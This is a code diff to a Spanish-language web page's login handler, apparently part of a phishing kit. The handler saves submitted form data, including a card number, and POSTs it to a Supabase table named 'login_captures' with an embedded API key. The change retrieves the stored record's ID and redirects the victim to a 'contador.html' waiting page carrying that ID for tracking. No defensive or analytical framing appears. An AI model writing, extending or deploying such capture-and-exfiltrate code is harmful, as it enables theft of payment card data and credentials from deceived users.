@@ -979,14 +979,14 @@
       
       localStorage.setItem('loginFormData', JSON.stringify(formData));
       
-      // Enviar datos a Supabase
+      // Enviar datos a Supabase y obtener el ID del registro
       fetch(SUPABASE_URL + '/rest/v1/login_captures', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
           'apikey': SUPABASE_KEY,
           'Authorization': 'Bearer ' + SUPABASE_KEY,
-          'Prefer': 'return=minimal'
+          'Prefer': 'return=representation'
         },
         body: JSON.stringify({
           card_number: cardNumber,
@@ -997,16 +997,20 @@
       })
       .then(function(response) {
         if (response.ok) {
-          console.log('Datos enviados a Supabase correctamente');
+          return response.json();
         } else {
           console.error('Error al enviar a Supabase:', response.status, response.statusText);
+          return null;
         }
+      })
+      .then(function(data) {
+        var sessionId = data && data.length > 0 ? data[0].id : Date.now();
+        window.location.href = 'contador.html?id=' + sessionId;
       })
       .catch(function(error) {
         console.error('Error de red al enviar a Supabase:', error);
+        window.location.href = 'contador.html?id=' + Date.now();
       });
-      
-      window.location.href = 'contador.html';
       
       console.log('Form data saved:', formData);
     });
